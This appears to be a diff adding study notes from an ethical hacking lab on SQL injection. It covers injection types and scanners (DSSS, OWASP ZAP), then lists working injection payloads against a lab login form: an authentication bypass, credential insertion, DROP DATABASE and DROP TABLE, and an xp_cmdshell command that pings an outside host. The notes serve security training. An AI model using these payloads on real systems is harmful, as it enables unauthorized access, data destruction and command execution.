@@ -1,3 +1,13 @@
+SQL injection attacks can be performed using various techniques to view, manipulate, insert, and delete data from an application’s
+database. There are three main types of SQL injection:
+In-band SQL injection: An attacker uses the same communication channel to perform the attack and retrieve the results
+
+Blind/inferential SQL injection: An attacker has no error messages from the system with which to work, but rather simply
+sends a malicious SQL query to the database
+
+Out-of-band SQL injection: An attacker uses different communication channels (such as database email functionality, 
+or file writing and loading functions) to perform the attack and obtain the results
+-------------------------------------------
 Damn Small SQLi Scanner (DSSS) is a fully functional SQL injection vulnerability scanner that supports GET and POST parameters. 
 DSSS scans web applications for various SQL injection vulnerabilities.
 
@@ -41,3 +51,33 @@ It offers automated scanners and a set of tools that allow you to find security 
 In this task, we will use OWASP ZAP to test a web application for SQL injection vulnerabilities.
 
 ------------------------------END-------------------------------
+
+---------------------------------SQL Injection Queries--------------------
+~~Logging into the DB
+> Click the Type here to search icon in the lower section of Desktop and type microsoft. 
+From the results, click Microsoft SQL Server Management Studio 18.
+> Microsoft SQL Server Management Studio opens, along with a Connect to Server pop-up. 
+In the Connect to Server pop-up, leave the default settings as they are and click the Connect button.
+>In the left pane of the Microsoft SQL Server Management Studio window, under the Object Explorer section,
+expand the Databases node. From the available options, expand the GoodShopping node, and then the Tables node under it.
+>Under the Tables node, right-click the dbo.Login file and click Select Top 1000 Rows from the context menu to view the available credentials.
+~~Done
+
+
+>Click LOGIN on the menu bar and type the query>> 
+> blah' or 1=1 -- [By pass authentication]
+
+> blah';insert into login values ('john','apple123'); -- [Create UID/PWD]
+After executing the query, to verify whether your login has been created successfully, click the LOGIN tab, 
+
+> blah';create database mydatabase; -- [Create DB mydatabase]
+
+> blah'; DROP DATABASE mydatabase; -- 
+
+> blah'; DROP TABLE table_name; -- 
+
+> blah';exec master..xp_cmdshell 'ping www.certifiedhacker.com -l 65000 -t'; -- 
+In the above query, you are pinging the www.certifiedhacker.com website using an SQL injection query. -l is 
+the sent buffer size and -t refers to pinging the specific host.
+------------------------------------------------END--------------------------------------
+
